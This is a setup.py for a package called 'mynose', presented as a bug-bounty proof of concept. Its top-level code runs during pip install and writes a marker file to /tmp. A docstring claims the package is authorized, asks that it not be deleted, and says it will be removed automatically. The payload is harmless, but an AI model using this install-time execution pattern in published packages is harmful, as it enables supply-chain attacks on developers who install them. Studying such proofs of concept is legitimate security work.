"""
NOTICE: This package is a benign Proof of Concept (PoC) created for a Bug Bounty 
demonstration. It performs a harmless file-write to /tmp/ to prove code execution 
during installation. This is NOT malware. This package is scheduled for automatic 
removal in 30 days. Please do not delete it as it's part of an authorized 
security research program.
"""

from setuptools import setup, find_packages
from setuptools.command.install import install
import os

# Proof of Concept logic
try:
    random_file_name = os.urandom(8).hex()
    with open(f"/tmp/{random_file_name}-poc.txt", "w") as f:
        f.write("Code executed during pip install!")
except Exception:
    pass

setup(
    name="mynose",
    version="1.3.1",
    author="Security Researcher",
    packages=find_packages(),
)